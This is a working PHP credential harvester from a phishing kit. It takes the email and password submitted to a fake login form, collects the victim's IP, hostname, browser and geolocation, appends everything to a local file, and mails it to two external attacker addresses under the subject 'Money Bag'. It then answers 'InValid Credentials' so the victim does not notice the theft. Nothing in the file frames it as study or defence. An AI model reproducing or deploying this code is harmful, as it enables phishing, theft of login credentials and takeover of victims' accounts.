<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
   
	$message .= "|----------| one Login |--------------|\n";
	$message .= "Email          : ".$email."\n";
	$message .= "Pass           : ".$password."\n";
	$message .= "|----------- I N F O | I P ----------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "City             : ". $ipdat->geoplugin_countryName ."\n";
	$message .= "Region           : ". $ipdat->geoplugin_regionName ."\n";
    $message .= "Country          : ". $ipdat->geoplugin_countryCode ."\n";
	$message .= "Country code     : ". $ipdat->geoplugin_countryName ."\n";
	$message .= "Browser  : ".$useragent."\n";
	$message .= "|----------- CrEaTeD --------------|\n";


	$send = "fenghima@yandex.com,gracemenh2022@protonmail.com";
	$subject = "Money Bag : $ip";$file = fopen("./cool.txt","a"); 
	fwrite($file,$message); 
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);







?>